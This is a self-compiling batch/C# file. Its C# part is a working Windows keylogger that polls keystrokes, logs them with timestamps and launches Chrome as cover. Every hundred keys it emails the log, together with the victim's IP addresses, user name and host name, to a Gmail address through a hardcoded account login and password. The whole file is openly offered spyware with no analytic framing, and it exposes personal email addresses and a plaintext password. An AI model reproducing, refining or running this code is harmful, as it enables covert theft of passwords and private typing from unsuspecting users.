// 2>nul||@goto :batch
/*
:batch
@echo off
setlocal
::del "%~n0.exe" /q
:: find csc.exe
set "csc="

for /r "%SystemRoot%\Microsoft.NET\Framework\" %%# in ("*csc.exe") do  set "csc=%%#"

if not exist "%csc%" (
   echo no .net framework installed
   exit /b 10
)

if not exist "%~n0.exe" (
   call %csc% /nologo /w:0 /out:"%~n0.exe" "%~dpsfnx0" || (
      exit /b %errorlevel% 
   )
)
%~n0.exe %*
endlocal & exit /b %errorlevel%

*/
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Diagnostics;

namespace KeyL0gger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);


        static long number = 0;

        static void Main(string[] args)
        {
            string filePath = "./Temp.txt";
			Process.Start("C:Program Files (x86)/Google/Chrome/Application/chrome.exe");
            while (true)
            {
                Thread.Sleep(5);

                for(int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState != 0)
                    {
                        using (StreamWriter sw = File.AppendText(filePath))
                        {
                            DateTime now = DateTime.Now;
                            sw.Write("[" + now.ToString() + "]" + (char)i);
                        }
                        number++;


                        if (number % 100 == 0)
                        {
                            SendMessage(filePath);
                        }
                    }
                }
            }
        }
        static void SendMessage(string filePath)
        {
            string logContents = File.ReadAllText(filePath);
            File.WriteAllText(filePath, String.Empty);


            DateTime now = DateTime.Now;
            string subject = "Message from logger";
            string emailBody = "";

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody += "Address: " + address;
            }
            emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\n host: " + host;
            emailBody += "\n time: " + now.ToString();
            emailBody += "\n " + logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("louisemuzzen22@gmail.com");
            mailMessage.To.Add("jostein.j.baustad@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("louisemuzzen22@gmail.com", "lapras31345");
            mailMessage.Body = emailBody;

            client.Send(mailMessage);
        }
    }
}